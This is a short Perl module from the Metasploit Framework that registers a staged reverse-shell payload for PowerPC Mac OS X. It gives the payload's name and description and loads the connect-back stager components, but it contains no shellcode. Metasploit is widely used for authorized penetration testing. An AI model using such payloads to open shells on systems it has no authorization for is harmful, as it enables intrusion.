
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::osx_ppc_reverse_nf_stg;
use strict;
use base 'Msf::PayloadComponent::OSX::ppc::ShellStage';

my $info =
{
	'Name'        => 'Mac OS X PPC Staged Reverse Null-Free Shell',
	'Version'     => '$Revision$',
	'Description' => 'Connect back on a port and spawn a shell as a stage',
};

sub _Load
{
	Msf::PayloadComponent::OSX::ppc::ShellStage->_Import('Msf::PayloadComponent::OSX::ppc::ReverseNFStager');

	__PACKAGE__->SUPER::_Load();
}

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };

	_Load();

	$hash = $class->MergeHashRec($hash, { 'Info' => $info });

	my $self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
